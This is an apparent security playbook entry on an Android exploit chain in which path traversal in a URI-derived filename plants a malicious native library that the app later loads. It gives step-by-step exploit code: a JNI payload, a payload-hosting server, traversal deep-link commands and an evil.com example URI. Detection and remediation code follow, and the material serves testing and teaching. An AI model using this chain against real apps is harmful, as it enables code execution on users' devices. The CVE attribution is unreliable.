# Android Path Traversal → Native Library Hijack → RCE

## Pattern Overview

A common Android RCE pattern combining:
1. Unsanitized filename from URI in file download/save operations
2. Dynamic native library loading from writable internal storage

## Vulnerable Code Pattern

### File Download with Unsanitized Filename

```kotlin
// VULNERABLE: getLastPathSegment() decodes %2F to /
val outFile = File(DOWNLOADS_DIRECTORY, uri.getLastPathSegment())

// Downloads from attacker-controlled URL, saves with attacker-controlled filename
val url = URL(uri.toString())
val connection = url.openConnection() as HttpURLConnection
val inputStream = BufferedInputStream(connection.inputStream)
val outputStream = FileOutputStream(outFile)
inputStream.copyTo(outputStream)
```

### Unsafe Native Library Loading

```kotlin
// VULNERABLE: loads from writable path without integrity check
val abi = Build.SUPPORTED_ABIS[0]
val libraryFolder = File(applicationContext.filesDir, "native-libraries/$abi")
val libraryFile = File(libraryFolder, "libplugin.so")
System.load(libraryFile.absolutePath)
```

## Why It Works

### Uri.getLastPathSegment() Decoding

Android's `Uri.getLastPathSegment()` implementation:
1. Splits the URI path on literal `/` characters
2. Returns the LAST segment
3. **Decodes percent-encoding** on the returned value

For URI: `https://evil.com/x/..%2F..%2F..%2F..%2Fdata%2Fdata%2Fpkg%2Ffiles%2Flib.so`
- Path split on `/`: `["x", "..%2F..%2F..%2F..%2Fdata%2Fdata%2Fpkg%2Ffiles%2Flib.so"]`
- Last segment (decoded): `../../../../data/data/pkg/files/lib.so`

### File Path Traversal

Java's `new File(parent, child)` does NOT sanitize `../` in the child:
```java
new File("/storage/emulated/0/Download", "../../../../data/data/pkg/files/lib.so")
// getAbsolutePath() = "/storage/emulated/0/Download/../../../../data/data/pkg/files/lib.so"
// getCanonicalPath() = "/data/data/pkg/files/lib.so"
```

### VFS Mount Boundary Crossing

The Linux kernel resolves `..` at the VFS layer, crossing mount boundaries:
- `/storage/emulated/0/Download/` → `../` → `/storage/emulated/0/`
- → `../` → `/storage/emulated/`
- → `../` → `/storage/`
- → `../` → `/` (root)
- → `data/data/pkg/files/` → target directory

The app process (UID) has write permission to its own `/data/data/<pkg>/files/` directory, so the write succeeds.

### mkdirs() Creates Intermediate Directories

Most download implementations call `outFile.getParentFile().mkdirs()` before writing. This automatically creates the `native-libraries/<abi>/` subdirectories in the target path.

### SELinux Allows Execution

Files in app internal storage get the `app_data_file` SELinux context. The `untrusted_app` domain is allowed to execute files with this context — this is by design for plugin frameworks and dynamic feature modules.

## Exploitation Steps

### 1. Compile Malicious .so

```c
#include <jni.h>
#include <android/log.h>
#include <stdio.h>
#include <unistd.h>

JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserved) {
    __android_log_print(ANDROID_LOG_ERROR, "PWNED", "RCE achieved! UID=%d PID=%d", getuid(), getpid());
    
    // Write proof file
    FILE *f = fopen("/data/data/<pkg>/files/pwned.txt", "w");
    if (f) { fprintf(f, "RCE: uid=%d pid=%d\n", getuid(), getpid()); fclose(f); }
    
    return JNI_VERSION_1_6;
}
```

Compile:
```bash
# arm64-v8a
$NDK/toolchains/llvm/prebuilt/*/bin/aarch64-linux-android<API>-clang \
  -shared -o libplugin.so payload.c -llog

# armeabi-v7a
$NDK/toolchains/llvm/prebuilt/*/bin/armv7a-linux-androideabi<API>-clang \
  -shared -o libplugin.so payload.c -llog
```

### 2. Host Payload (Custom Server Required)

**PITFALL:** Python's `http.server` and most standard HTTP servers decode `%2F` in URL paths and resolve `../` on their filesystem, returning 404.

Use a custom server that ignores the request path:

```python
#!/usr/bin/env python3
import http.server, os

SO_FILE = "libplugin.so"

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        with open(SO_FILE, "rb") as f:
            data = f.read()
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)
    def log_message(self, fmt, *args):
        print(f"[HIT] {args[0]}")

http.server.HTTPServer(("0.0.0.0", 8888), Handler).serve_forever()
```

### 3. Calculate Traversal Depth

From `Environment.getExternalStoragePublicDirectory(DIRECTORY_DOWNLOADS)`:
- Typical path: `/storage/emulated/0/Download`
- Depth to root: 4 levels (`Download` → `0` → `emulated` → `storage` → `/`)
- Traversal prefix: `..%2F..%2F..%2F..%2F`

Target path from root: `data/data/<pkg>/files/native-libraries/<abi>/libplugin.so`

Full payload segment: `..%2F..%2F..%2F..%2Fdata%2Fdata%2F<pkg>%2Ffiles%2Fnative-libraries%2F<abi>%2Flibplugin.so`

### 4. Trigger Deep Link

```bash
HOST_IP="192.168.1.3"
PKG="com.example.app"
ABI="arm64-v8a"
LIB="libplugin.so"

adb shell am start -a android.intent.action.VIEW \
  -t "application/pdf" \
  -d "http://${HOST_IP}:8888/x/..%2F..%2F..%2F..%2Fdata%2Fdata%2F${PKG}%2Ffiles%2Fnative-libraries%2F${ABI}%2F${LIB}" \
  $PKG
```

Or via browser intent URI:
```
intent://<HOST_IP>:8888/x/..%2F..%2F..%2F..%2Fdata%2Fdata%2F<PKG>%2Ffiles%2Fnative-libraries%2F<ABI>%2F<LIB>#Intent;scheme=http;type=application/pdf;package=<PKG>;end
```

### 5. Trigger Library Load (Relaunch App)

```bash
adb shell am start -S -W -n <pkg>/.MainActivity
```

The `-S` flag force-stops before starting — essential for clean restart.

### 6. Verify

```bash
adb logcat -d | grep "PWNED"
adb shell "run-as <pkg> cat /data/data/<pkg>/files/pwned.txt"
```

## Timing Considerations

If `handleIntent()` (async download) and `loadLibrary()` (sync) are in the same `onCreate()`:
- The download runs on a background coroutine/thread
- Library load happens on main thread before download completes
- **This is always a 2-step attack:** first visit plants the .so, second launch loads it

If the app has `onNewIntent()` or re-creates the activity, it might be possible to trigger both in one session — but this is rare.

## Detection Checklist (Static Analysis)

Look for these patterns during Phase 2:

1. **Deep link intent filters** with `http`/`https`/`file` schemes
2. **`Uri.getLastPathSegment()`** used as filename without sanitization
3. **`new File(base, userInput)`** where userInput comes from URI
4. **`System.load()`** with path under `getFilesDir()`, `getCacheDir()`, or `getExternalFilesDir()`
5. **No `File.getCanonicalPath()` validation** after constructing output path
6. **`mkdirs()`** called on parent directory (enables creation of traversal target dirs)

## Variants

| Variant | Description |
|---------|-------------|
| DEX loading | `DexClassLoader` from writable path instead of native .so |
| Plugin frameworks | Apps loading plugins from internal storage (common in super-apps) |
| Font/asset loading | Custom fonts or assets loaded from writable cache |
| WebView cache poisoning | Overwriting cached JS/HTML in WebView cache directory |

## Real-World CVEs

- CVE-2021-21220: Chrome V8 exploit delivered via similar deep link pattern
- Multiple banking app vulnerabilities (undisclosed) using this exact chain
- MobileHackingLab Document Viewer (training challenge)

## Remediation

```kotlin
// SAFE: Sanitize filename
fun sanitizeFilename(uri: Uri): String {
    val segment = uri.lastPathSegment ?: "download.pdf"
    // Remove path separators and traversal sequences
    return segment.replace("/", "_").replace("..", "_").replace("\\", "_")
}

// SAFE: Canonical path validation
fun validateOutputPath(baseDir: File, filename: String): File {
    val outFile = File(baseDir, filename)
    val canonical = outFile.canonicalPath
    val baseCanonical = baseDir.canonicalPath
    require(canonical.startsWith(baseCanonical)) {
        "Path traversal detected: $canonical is outside $baseCanonical"
    }
    return outFile
}

// SAFE: Native library integrity check
fun loadVerifiedLibrary(libraryFile: File, expectedHash: String) {
    val actualHash = MessageDigest.getInstance("SHA-256")
        .digest(libraryFile.readBytes())
        .joinToString("") { "%02x".format(it) }
    require(actualHash == expectedHash) { "Library integrity check failed" }
    System.load(libraryFile.absolutePath)
}
```
